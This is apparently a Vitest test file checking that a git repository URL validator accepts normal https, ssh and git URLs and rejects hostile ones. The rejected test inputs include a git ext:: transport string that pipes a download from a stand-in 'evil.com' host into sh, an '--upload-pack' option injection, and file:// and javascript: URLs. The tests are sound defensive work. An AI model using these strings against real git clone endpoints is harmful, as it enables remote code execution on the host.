import { describe, expect, it } from "vitest";

import { ProjectRegistrationError, assertSafeGitRepoUrl } from "../projects.js";

// These tests lock down the scheme allowlist used by cloneRepository to
// prevent the `git ext::` RCE chain.

describe("assertSafeGitRepoUrl", () => {
  // ── Allowed forms ──────────────────────────────────────────────────────────

  it("accepts an https github URL", () => {
    expect(() => assertSafeGitRepoUrl("https://github.com/owner/repo.git")).not.toThrow();
  });

  it("accepts an http github URL", () => {
    expect(() => assertSafeGitRepoUrl("http://github.com/owner/repo.git")).not.toThrow();
  });

  it("accepts a git:// URL", () => {
    expect(() => assertSafeGitRepoUrl("git://github.com/owner/repo")).not.toThrow();
  });

  it("accepts an ssh:// URL", () => {
    expect(() => assertSafeGitRepoUrl("ssh://git@github.com/owner/repo.git")).not.toThrow();
  });

  it("accepts the git@host:path SSH form", () => {
    expect(() => assertSafeGitRepoUrl("git@github.com:owner/repo.git")).not.toThrow();
  });

  // ── Rejected forms (security-critical) ─────────────────────────────────────

  it("rejects the git ext:: RCE transport", () => {
    expect(() => assertSafeGitRepoUrl("ext::sh -c 'curl evil.com|sh' %S")).toThrow(
      ProjectRegistrationError
    );
  });

  it("rejects ext::https hybrid form", () => {
    expect(() => assertSafeGitRepoUrl("ext::https://github.com/owner/repo")).toThrow(
      ProjectRegistrationError
    );
  });

  it("rejects URLs starting with -", () => {
    expect(() => assertSafeGitRepoUrl("--upload-pack=evil")).toThrow(ProjectRegistrationError);
  });

  it("rejects file:// scheme", () => {
    expect(() => assertSafeGitRepoUrl("file:///etc/passwd")).toThrow(ProjectRegistrationError);
  });

  it("rejects javascript: scheme", () => {
    expect(() => assertSafeGitRepoUrl("javascript:alert(1)")).toThrow(ProjectRegistrationError);
  });

  it("rejects an empty string", () => {
    expect(() => assertSafeGitRepoUrl("")).toThrow(ProjectRegistrationError);
  });

  it("rejects whitespace only", () => {
    expect(() => assertSafeGitRepoUrl("   ")).toThrow(ProjectRegistrationError);
  });

  it("rejects URLs missing a hostname", () => {
    expect(() => assertSafeGitRepoUrl("https://")).toThrow(ProjectRegistrationError);
  });

  it("rejects garbage strings", () => {
    expect(() => assertSafeGitRepoUrl("not-a-url")).toThrow(ProjectRegistrationError);
  });

  it("rejects malformed git@ form", () => {
    expect(() => assertSafeGitRepoUrl("git@evil host:owner/repo")).toThrow(
      ProjectRegistrationError
    );
  });

  it("rejects URLs containing ::", () => {
    expect(() => assertSafeGitRepoUrl("https://github.com/owner/repo::evil")).toThrow(
      ProjectRegistrationError
    );
  });

  it("thrown errors use invalid_repository_url code and 400 status", () => {
    try {
      assertSafeGitRepoUrl("ext::sh -c id");
      expect.fail("should have thrown");
    } catch (error) {
      expect(error).toBeInstanceOf(ProjectRegistrationError);
      const err = error as ProjectRegistrationError;
      expect(err.code).toBe("invalid_repository_url");
      expect(err.statusCode).toBe(400);
    }
  });
});
